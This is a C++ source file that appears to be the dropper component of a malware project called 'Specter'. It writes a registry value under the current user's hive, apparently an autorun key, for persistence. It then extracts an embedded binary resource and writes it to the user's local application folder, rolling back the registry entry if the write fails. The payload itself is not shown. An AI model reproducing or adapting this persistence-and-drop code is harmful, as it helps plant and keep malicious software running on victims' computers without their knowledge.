#include "SpecterBasicDeployment.hpp"
#include "SpecterLib/SyscallException.h"
#include "SpecterLib/CommonPaths.h"
#include "SpecterLib/ResourceUtils.h"
#include "resource.h"

#include <fstream>
#include <winreg/WinReg.hpp>

SpecterBasicDeployment::SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name):
	m_program_name(std::move(program_name)),
	m_target_file(CommonPaths::GetLocalPath() / target_file_name),
	m_reg_key(HKEY_CURRENT_USER, kTargetRegistry)
{
}

bool SpecterBasicDeployment::IsInstalled() const
{
	return IsPersistent() && IsDeployedOnFilesystem();
}

bool SpecterBasicDeployment::IsPersistent() const
{
	const auto result = m_reg_key.TryGetStringValue(m_program_name);

	return result.IsValid() && result.GetValue() == m_target_file;
}

bool SpecterBasicDeployment::IsDeployedOnFilesystem() const
{
	return exists(m_target_file);
}

bool SpecterBasicDeployment::Install()
{
	try
	{
		if (!EnablePersistence())
		{
			return false;
		}

		if (!DeployBinary())
		{
			DisablePersistence();
			return false;
		}

		return true;
	}
	catch (const std::exception&)
	{
		return false;
	}
}

bool SpecterBasicDeployment::EnablePersistence()
{
	const auto result = m_reg_key.TrySetStringValue(m_program_name, m_target_file);
	return result.IsOk();
}

bool SpecterBasicDeployment::DeployBinary() const
{
	const auto specter_binary_content = ResourceUtils::ReadRawResource(SPECTER_X86_BINARY);
	if (!specter_binary_content.has_value())
	{
		return false;
	}

	std::ofstream output_stream(m_target_file);
	if (!output_stream.is_open())
	{
		return false;
	}

	output_stream.write(specter_binary_content->data(), specter_binary_content->size());
	return true;
}

void SpecterBasicDeployment::DisablePersistence()
{
	m_reg_key.DeleteValue(m_program_name);
}